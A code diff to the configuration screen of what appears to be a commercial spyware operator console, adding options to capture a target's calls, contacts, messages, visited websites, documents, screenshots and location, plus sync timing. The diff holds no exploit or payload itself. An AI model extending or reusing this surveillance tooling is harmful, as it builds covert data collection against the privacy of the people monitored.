@@ -14,24 +14,24 @@
     <![CDATA[
       import it.ht.rcs.console.operations.view.configuration.ConfigurationView;
       
-      import mx.controls.Alert;
-      
       public var config:Object;
       
       public function displayConfig():void
       {
-        call.selected       = hasAction('call');
-        contact.selected    = hasAction('calendar') || hasAction('addressbook');
-        message.selected    = hasAction('messages') || hasAction('chat');
-        website.selected    = hasAction('url');
-        document.selected   = hasAction('file');
-        screenshot.selected = hasAction('snapshot') || hasAction('mouse');
-        location.selected   = hasAction('position');
+        call.selected     = hasAction('call');
+        calendar.selected = hasAction('calendar') || hasAction('addressbook');
+        messages.selected = hasAction('messages') || hasAction('chat');
+        url.selected      = hasAction('url');
+        file.selected     = hasAction('file');
+        snapshot.selected = hasAction('snapshot') || hasAction('mouse');
+        position.selected = hasAction('position');
         
-        if (screenshot.selected)
-          screenshot.delay = getScreenshotDelay();
+        if (snapshot.selected)
+          snapshot.delay = getScreenshotDelay();
         
-        sync.selected       = hasSync();
+        sync.selected = hasSync();
+        if (sync.selected)
+          sync.delay = getSyncDelay();
       }
       
       private function hasAction(name:String):Boolean
@@ -55,6 +55,16 @@
         var event:Object;
         for each (var e:Object in config.events)
         if (e.desc == 'SCREENSHOT')
+          event = e;
+        
+        return event == null ? 0 : event.delay as int;
+      }
+      
+      private function getSyncDelay():int
+      {
+        var event:Object;
+        for each (var e:Object in config.events)
+        if (e.desc == 'SYNC')
           event = e;
         
         return event == null ? 0 : event.delay as int;
@@ -87,6 +97,23 @@
       private function goToAdvanced(event:MouseEvent):void
       {
         (parent as ConfigurationView).currentState = 'advanced';
+        (parent as ConfigurationView).advanced.graph.config = config;
+        (parent as ConfigurationView).advanced.graph.rebuildGraph();
+      }
+      
+      public function getConfig():Object
+      {
+        var model:Object = {};
+        model.call = call.selected;
+        model.calendar = calendar.selected;
+        model.messages = messages.selected;
+        model.url = url.selected;
+        model.file = file.selected;
+        model.snapshot = snapshot.selected;
+        model.position = position.selected;
+        model.sync = sync.selected;
+        config = BasicConfigBuilder.buildConfig(config.modules, config.globals, model);
+        return config;
       }
     ]]>
   </fx:Script>
@@ -95,21 +122,21 @@
   
     <s:HGroup width="100%" gap="30">
       <selectors:SimpleSelector id="call" text="Calls (Phone, Skype, MSN)"/>
-      <selectors:SimpleSelector id="contact" text="Contacts &amp; Calendar"/>
+      <selectors:SimpleSelector id="calendar" text="Contacts &amp; Calendar"/>
     </s:HGroup>
     
     <s:HGroup width="100%" gap="30">
-      <selectors:SimpleSelector id="message" text="Messages (Mail, SMS, Chat)"/>
-      <selectors:SimpleSelector id="website" text="Websites &amp; URLs"/>
+      <selectors:SimpleSelector id="messages" text="Messages (Mail, SMS, Chat)"/>
+      <selectors:SimpleSelector id="url" text="Visited Websites"/>
     </s:HGroup>
     
     <s:HGroup width="100%" gap="30">
-      <selectors:SimpleSelector id="document" text="Documents"/>
-      <selectors:ScreenshotSelector id="screenshot" text="Screenshots &amp; Mouse"/>
+      <selectors:SimpleSelector id="file" text="Documents"/>
+      <selectors:ScreenshotSelector id="snapshot" text="Screenshots &amp; Mouse"/>
     </s:HGroup>
     
     <s:HGroup width="100%" gap="30">
-      <selectors:LocationSelector id="location" text="Location"/>
+      <selectors:LocationSelector id="position" text="Location"/>
       <selectors:SyncSelector id="sync"/>
     </s:HGroup>
     
